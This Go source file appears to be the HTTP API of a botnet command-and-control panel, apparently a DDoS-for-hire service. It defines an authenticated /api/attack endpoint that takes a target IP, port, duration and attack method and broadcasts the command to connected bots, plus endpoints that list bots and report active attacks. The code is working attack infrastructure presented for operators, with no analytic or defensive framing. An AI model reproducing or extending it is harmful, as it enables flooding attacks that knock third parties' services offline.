package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"time"
)

type apiSrv struct {
	port   string
	server *http.Server
	up     bool
}

type apiResp struct {
	OK   bool        `json:"success"`
	Msg  string      `json:"message,omitempty"`
	Data interface{} `json:"data,omitempty"`
}

type attackReq struct {
	Method   string `json:"method"`
	TargetIP string `json:"target_ip"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	Username string `json:"username"`
	Token    string `json:"token"`
	Secret   string `json:"secret"`
}

type statsResp struct {
	TotalBots     int    `json:"total_bots"`
	ActiveBots    int    `json:"active_bots"`
	TotalAttacks  int    `json:"total_attacks"`
	ActiveAttacks int    `json:"active_attacks"`
	Uptime        string `json:"uptime"`
}

var (
	api       *apiSrv
	startedAt time.Time
)

func init() { startedAt = time.Now() }

func newAPISrv(port string) *apiSrv { return &apiSrv{port: port} }

func (s *apiSrv) Start() error {
	if s.up {
		return fmt.Errorf("already running")
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/attack", s.rateWrap(s.doAttack))
	mux.HandleFunc("/api/bots", s.rateWrap(s.listBots))
	mux.HandleFunc("/api/stats", s.rateWrap(s.getStats))
	s.server = &http.Server{Addr: ":" + s.port, Handler: mux}
	s.up = true
	go func() {
		fmt.Printf("[api] https on :%s\n", s.port)
		if err := s.server.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[api] err: %v\n", err)
			s.up = false
		}
	}()
	return nil
}

func (s *apiSrv) doAttack(w http.ResponseWriter, r *http.Request) {
	tok := r.Header.Get("X-API-Token")
	if ok, wait := checkThrottle(throttleAPI, tok); !ok {
		s.fail(w, fmt.Sprintf("rate limited, retry in %v", wait), http.StatusTooManyRequests)
		return
	}
	if r.Method != http.MethodPost {
		s.fail(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req attackReq
	if json.NewDecoder(r.Body).Decode(&req) != nil {
		s.fail(w, "bad json", http.StatusBadRequest)
		return
	}
	if req.Method == "" || req.TargetIP == "" || req.Port <= 0 || req.Duration <= 0 || req.Username == "" || req.Token == "" || req.Secret == "" {
		s.fail(w, "missing fields", http.StatusBadRequest)
		return
	}
	if ip := net.ParseIP(req.TargetIP); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsMulticast() {
			s.fail(w, "target not allowed", http.StatusBadRequest)
			return
		}
	}
	if req.Port < 1 || req.Port > 65535 {
		s.fail(w, "port out of range", http.StatusBadRequest)
		return
	}
	if int64(req.Duration)*int64(time.Second) < 0 {
		s.fail(w, "duration overflow", http.StatusBadRequest)
		return
	}
	if !isValidMethod(req.Method) {
		s.fail(w, "unknown method", http.StatusBadRequest)
		return
	}
	if !s.apiAuth(req.Token, req.Secret, req.Username) {
		s.fail(w, "auth failed", http.StatusUnauthorized)
		return
	}
	users, err := loadUsers()
	if err != nil {
		s.fail(w, "internal error", http.StatusInternalServerError)
		return
	}
	var u *account
	for i := range users {
		if users[i].Username == req.Username {
			u = &users[i]
			break
		}
	}
	if u == nil || !u.allowed(req.Method) {
		s.fail(w, "forbidden", http.StatusForbidden)
		return
	}
	ip := net.ParseIP(req.TargetIP)
	if ip == nil || !validateIP(req.TargetIP) {
		s.fail(w, "invalid target", http.StatusBadRequest)
		return
	}
	ip4 := ip.To4()
	if ip4 == nil {
		s.fail(w, "ipv4 required", http.StatusBadRequest)
		return
	}
	var cmd cmdPayload
	copy(cmd.Method[:], req.Method)
	copy(cmd.TargetIP[:], ip4)
	cmd.Port = uint16(req.Port)
	cmd.Duration = uint32(req.Duration)
	broadcast(cmd)

	a := attack{
		method: req.Method, target: req.TargetIP, port: strconv.Itoa(req.Port),
		dur: time.Duration(req.Duration) * time.Second, started: time.Now(), who: req.Username,
	}
	histMu.Lock()
	history = append(history, a)
	histMu.Unlock()
	trackAPIAttack(a)

	s.ok(w, apiResp{OK: true, Msg: "attack started"}, http.StatusOK)
}

func (s *apiSrv) listBots(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.fail(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tok := r.URL.Query().Get("token")
	sec := r.URL.Query().Get("secret")
	usr := r.URL.Query().Get("username")
	if tok == "" || sec == "" || usr == "" {
		s.fail(w, "missing auth params", http.StatusBadRequest)
		return
	}
	if !s.apiAuth(tok, sec, usr) {
		s.fail(w, "auth failed", http.StatusUnauthorized)
		return
	}
	s.ok(w, apiResp{OK: true, Data: activeBots()}, http.StatusOK)
}

func (s *apiSrv) getStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.fail(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tok := r.URL.Query().Get("token")
	sec := r.URL.Query().Get("secret")
	usr := r.URL.Query().Get("username")
	if tok == "" || sec == "" || usr == "" {
		s.fail(w, "missing auth params", http.StatusBadRequest)
		return
	}
	if !s.apiAuth(tok, sec, usr) {
		s.fail(w, "auth failed", http.StatusUnauthorized)
		return
	}
	sum := pulse.summary()
	apiAtkMu.RLock()
	apiActive := len(apiAttacks)
	apiAtkMu.RUnlock()
	atkMu.Lock()
	stdActive := len(liveAttacks)
	atkMu.Unlock()
	histMu.Lock()
	total := len(history)
	histMu.Unlock()

	s.ok(w, apiResp{OK: true, Data: statsResp{
		TotalBots: sum["TOTAL"], ActiveBots: sum["ONLINE"] + sum["LAGGING"],
		TotalAttacks: total, ActiveAttacks: stdActive + apiActive,
		Uptime: time.Since(startedAt).Truncate(time.Second).String(),
	}}, http.StatusOK)
}

func (s *apiSrv) apiAuth(tok, sec, usr string) bool {
	if stored, ok := vault.Get(usr + "_api_secret"); ok && safeCompare(stored, sec) {
		return true
	}
	users, err := loadUsers()
	if err != nil {
		return false
	}
	for _, u := range users {
		if u.Username == usr {
			if tok != u.APIToken {
				return false
			}
			return verifySecret(u.APISecret, sec)
		}
	}
	return false
}

func (s *apiSrv) rateWrap(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		if ok, wait := checkThrottle(throttleConn, ip); !ok {
			s.fail(w, fmt.Sprintf("rate limited, retry in %v", wait), http.StatusTooManyRequests)
			return
		}
		next(w, r)
	}
}

func (s *apiSrv) ok(w http.ResponseWriter, resp apiResp, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(resp)
}

func (s *apiSrv) fail(w http.ResponseWriter, msg string, code int) {
	s.ok(w, apiResp{OK: false, Msg: msg}, code)
}
